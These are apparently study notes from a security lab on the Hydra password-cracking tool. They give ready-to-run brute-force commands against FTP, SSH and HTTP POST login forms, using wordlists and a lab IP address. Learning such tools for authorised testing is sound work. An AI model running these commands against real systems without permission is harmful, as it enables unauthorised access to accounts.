# Hydra
Download Hydra [here](https://github.com/vanhauser-thc/thc-hydra)
---
## Commands
- Commands depend on the protocol we are attacking
  - E.g. `hydra -l user -P passlist.txt ftp://10.10.44.141`
- Lets take a look at SSH and Web
- SSH
  - `hydra -l <username> -P <full path to pass> [IP Address] -t 4 ssh`
  - `t` specifies the number of threads to use
- POST login form
  - `hydra -l <username> -P <wordlist> 10.10.44.141 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`
  - <img src="https://user-images.githubusercontent.com/109667444/226665620-4ef1c721-c90a-45ae-8ed4-acbefe9655b9.png" alt= “options” style="width:400px; height:600px">
